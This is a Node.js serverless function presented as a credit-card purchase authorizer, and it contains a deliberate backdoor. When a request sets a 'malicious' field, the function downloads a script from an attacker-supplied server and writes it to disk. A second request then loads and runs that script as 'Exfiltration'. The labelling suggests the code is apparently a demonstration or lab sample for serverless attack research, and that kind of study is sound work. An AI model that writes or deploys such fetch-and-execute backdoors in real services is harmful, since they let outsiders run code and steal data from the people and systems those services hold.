"use strict";

const fs = require("fs");
const axios = require("axios");

module.exports.main = async (event, context) => {
  console.log("Function productPurchaseAuthorizeCC running.")

  if (event.body["malicious"]) {
    return await maliciousFunctions(event)
  }

  console.log("Normal flow")

  let result = {};
  result.devFinished = "false: does not access database, assumes creditCard is always supplied";

  if (event.body["creditCard"]) {
	  if (Math.random() < .01) {
	    result.approved = false;
	    result.failureReason = "Credit card authorization failed";
	  } else {
	    result.approved = true;
	    result.authorization = Math.floor(Math.random() * Number.MAX_SAFE_INTEGER);
	  }
	  result.malicious = event.body["malicious"];
	} else {
	  result.approved = false;
	  result.failureResaon = "Database access not yet implemented.";
	};

  return result;
};

const maliciousFunctions = async (event) => {
  if (event.body["malicious"] == "one") {
    console.log("Step 1: Downloading attack scripts.");

    const downloadStatus = await downloadFile(event.body["attackServer"], event.body["attackFile"]);

    return {
      approved: false,
      failureReason: downloadStatus
    };
  } else if (event.body["malicious"] == "two") {
    console.log("Step 2: Exfiltration.");
    try {
      const dynamo = require(`${event.body["attackFile"]}`)
      const response = await dynamo.exec()
      return {
        approved: false,
        failureReason: response
      };
    } catch {
      return {
        approved: false,
        failureReason: `${event.body["attackFile"]} maybe not exist.`
      };
    }
  }
}

const downloadFile = async (server, file) => {
  try {
    console.log("Start of downloadFile");
    const url = server + "/" + file;
    console.log("URL: " + url);

    const response = await axios.get(url);
    const response_data = response["data"]

    const localfile = `${file}`;
    fs.writeFileSync(localfile, response_data, (err) => {
        if (err) throw err;
    });

    console.log("Script downloaded.");

    console.log(response_data);

    return "Script successfully downloaded to " + localfile;
  } catch (error) {
    console.log(error);
    return "Error downloading script. Error: " + error;
  }
}
